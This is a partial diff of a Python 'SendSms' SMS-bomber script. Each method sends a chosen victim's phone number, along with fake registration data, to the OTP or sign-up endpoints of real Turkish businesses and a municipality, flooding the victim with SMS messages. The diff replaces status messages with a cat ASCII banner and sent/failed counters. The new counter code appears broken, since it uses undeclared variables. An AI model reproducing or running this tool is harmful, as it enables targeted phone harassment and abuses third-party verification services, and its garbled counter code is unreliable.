+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> toptanteslim.com")
-
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1
 
     #uysalmarket.com.tr
     def Uysal(self):
@@ -626,13 +1075,25 @@ class SendSms():
             json={"phone_number": self.phone}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.uysalmarket.com.tr")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.uysalmarket.com.tr")
-    
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1    
     
     #yapp.com.tr
     def Yapp(self):
@@ -641,13 +1102,25 @@ class SendSms():
             json={"app_version": "1.1.2", "code": "tr", "device_model": "iPhone9,4", "device_name": "", "device_type": "I", "device_version": "15.7.8", "email": self.mail, "firstname": "Memati", "is_allow_to_communication": "1", "language_id": "1", "lastname": "Bas", "phone_number": self.phone, "sms_code": ""}
             r = requests.post(url=url, json=json, timeout=6)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> yapp.com.tr")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> yapp.com.tr")
-    
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1    
     
     #yilmazticaret.net
     def YilmazTicaret(self):
@@ -657,13 +1130,25 @@ class SendSms():
             data = {"telefon": (None, f"0 {self.phone}"),"token": (None, "ExponentPushToken[eWJjFaN_bhjAAbN_rxUIlp]")}
             r = requests.post(url, headers=headers,  data=data, timeout=6)
             if r.json()["giris"] == "success":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> yilmazticaret.net")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> yilmazticaret.net")
-    
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1    
     
     #yuffi.co
     def Yuffi(self):
@@ -672,13 +1157,25 @@ class SendSms():
             json = {"phone": self.phone, "kvkk": True}
             r = requests.post(url, json=json, timeout=6)
             if r.json()["success"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.yuffi.co")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.yuffi.co")
-            
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1            
 
     #beefull.com
     def  Beefull(self):
@@ -690,13 +1187,25 @@ class SendSms():
             json={"phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull"}
             r = requests.post(url, json=json, timeout=4)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> app.beefull.io")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> app.beefull.io")
-
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1
 
     #starbucks.com.tr
     def Starbucks(self):
@@ -706,13 +1215,25 @@ class SendSms():
             json={"allowEmail": True, "allowSms": True, "deviceId": "31", "email": self.mail, "firstName": "Memati", "lastName": "Bas", "password": "31ABC..abc31", "phoneNumber": self.mail, "preferredName": "Memati"}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["code"] == 50:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> auth.sbuxtr.com")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> auth.sbuxtr.com")
-
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1
 
     #dominos.com.tr
     def Dominos(self):
@@ -722,13 +1243,25 @@ class SendSms():
             json={"email": self.mail, "isSure": False, "mobilePhone": self.phone}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["isSuccess"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> frontend.dominos.com.tr")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> frontend.dominos.com.tr")
-
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1
 
     #baydoner.com
     def Baydoner(self):
@@ -738,13 +1271,25 @@ class SendSms():
             json={"AppVersion": "1.3.2", "AreaCode": 90, "City": "ADANA", "CityId": 1, "Code": "", "Culture": "tr-TR", "DeviceId": "31s", "DeviceModel": "31", "DeviceToken": "3w1", "Email": self.mail, "GDPRPolicy": False, "Gender": "Erkek", "GenderId": 1, "LoyaltyProgram": False, "merchantID": 5701, "Method": "", "Name": "Memati", "notificationCode": "31", "NotificationToken": "31", "OsSystem": "IOS", "Password": "31Memati31", "PhoneNumber": self.phone, "Platform": 1, "sessionID": "31", "socialId": "", "SocialMethod": "", "Surname": "Bas", "TempId": 942603, "TermsAndConditions": False}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["Control"] == 1:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> crmmobil.baydoner.com")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> crmmobil.baydoner.com")
-
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1
 
     #pidem.com.tr
     def Pidem(self):
@@ -754,13 +1299,25 @@ class SendSms():
             json={"query": "\n  mutation ($phone: String) {\n    sendOtpSms(phone: $phone) {\n      resultStatus\n      message\n    }\n  }\n", "variables": {"phone": self.phone}}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["data"]["sendOtpSms"]["resultStatus"] == "SUCCESS":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> restashop.azurewebsites.net")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> restashop.azurewebsites.net")
-
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1
 
     #frink.com.tr
     def Frink(self):
@@ -770,13 +1327,25 @@ class SendSms():
             json={"areaCode": "90", "etkContract": True, "language": "TR", "phoneNumber": "90"+self.phone}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["processStatus"] == "SUCCESS":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.frink.com.tr")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.frink.com.tr")
-
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1
 
     #bodrum.bel.tr
     def Bodrum(self):
@@ -786,9 +1355,22 @@ class SendSms():
             json={"gsm": "+90"+self.phone, "source": "orwi"}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gandalf.orwi.app")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gandalf.orwi.app")
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1
